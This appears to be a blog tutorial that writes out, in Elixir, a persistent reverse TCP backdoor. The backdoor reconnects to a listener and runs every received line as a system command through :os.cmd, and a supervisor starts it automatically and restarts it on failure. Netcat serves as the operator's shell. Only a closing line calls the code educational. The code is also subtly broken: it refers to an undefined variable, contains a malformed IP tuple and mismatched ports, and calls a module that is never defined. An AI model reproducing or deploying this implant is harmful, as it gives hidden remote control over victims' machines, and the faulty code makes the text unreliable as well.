Elixir and Erlang seem to be very good fits for a reverse tcp backdoor shell. Afterall the network can disconnect, the target can shutdown their machine, etc. Things can and will go wrong! The Beam offers us great patterns and strategies to deal with these failures.

In this article we will build a supervised fault tolerant reverse tcp shell that can handle failures from both the client side as well as the server side. Let's get started. First run:

```bash
mix new backdoor --sup
```

This will create our new project. We will be using :gen_tcp from Erlang for all the TCP operations. This library uses the OS tcp libraries to make tcp sockets that we can read and write to like files. Open up the Backdoor module and type this in:

```elixir
defmodule Backdoor do
  @moduledoc """
  Main TCP process loops and handlers
  """
  require Logger

  # make tcp connection to host on port
  def connect(host, port) do
    Logger.info "Atempting to connect to #{inspect(host)} on port #{port}"
    case :gen_tcp.connect(host, port,
      [:binary, packet: :line, active: false, reuseaddr: true]) do
        {:ok, socket} ->
          # if connected send a prompt and start serve loop
          ''
          |> Prompt.add_prompt()
          |> write_line(socket)
          Task.start_link(fn -> serve(socket) end)
        {:error, reason} ->
          # if connection failed wait and try again in 5 seconds
          Logger.info(inspect(reason))
          Logger.info "Could not connect to #{inspect(host)} on port #{port}"
          Process.sleep(5000)
          connect(master, port)
      end
  end

  # server loop
  defp serve(socket) do
    # read a line
    line =
      read_line(socket)
      |> IO.chardata_to_string()
    command = Prompt.remove_newline(line)
    case command do
      "exit" ->
        # if command is exit then close the socket
        # This is not really needed but is an example of matching custom commands
        :ok = :gen_tcp.close(socket)
      com ->
        # anything else is treated as a system command and is piped to :os.cmd/1
        String.to_charlist(com)
        |> :os.cmd()
        |> Prompt.add_prompt()
        |> write_line(socket)
        # recursive loop
        serve(socket)
    end
  end

  # These are helper functions for reading lines, formatting prompts, etc
  defp read_line(socket) do
    case :gen_tcp.recv(socket, 0) do
      {:ok, data} ->
        data
      {:error, reason} ->
        Logger.info(inspect(reason))
        Logger.info "Could not receive"
    end
  end

  defp write_line(line, socket) do
    :gen_tcp.send(socket, line)
  end
    def remove_newline(line) do
    line
    |> String.replace("\r", "")
    |> String.replace("\n", "")
  end

  def add_prompt(charlist) do
    charlist ++ '\n\r =>>$'
  end

  def add_prompt_string(string) do
    string <> "\n\r =>>$"
  end
end
```

Great! we can already use this in iex:

```bash
iex -S mix
iex(1)> Backdoor.connect({127, 0, 0, 1}, 5555)
```

Hmm... that was a weird way to specify localhost, but that is Erlang for you. In another terminal we can run netcat:

```bash
nc -l localhost 555
=>>$ ls

Documents
Downloads
...
```

Alright we got our command prompt and we can run system commands. But we can't survive any failures... So we need to get supervised! Open up the Application module and add this:

```elixir
defmodule Backdoor.Application do
  use Application

  @impl true
  def start(_type, _args) do
    children = [
     # Add this map
     %{
        id: ReverseTCP,
        start: {Backdoor, :connect, [{127, 0, 0 1}, 555]}
      },
    ]

    opts = [strategy: :one_for_one, name: Backdoor.Supervisor]
    Supervisor.start_link(children, opts)
  end
end
```

Now we are supervising the backdoor process so if something goes wrong it will restart itself! We don't need to call the function from iex it will just get called on startup. You can try it by stopping the process in observer or hitting Ctrl+C from netcat.

Please remember this code is just for educational purposes. You can find all the code and more [here](https://github.com/karangejo/elixir-backdoor).
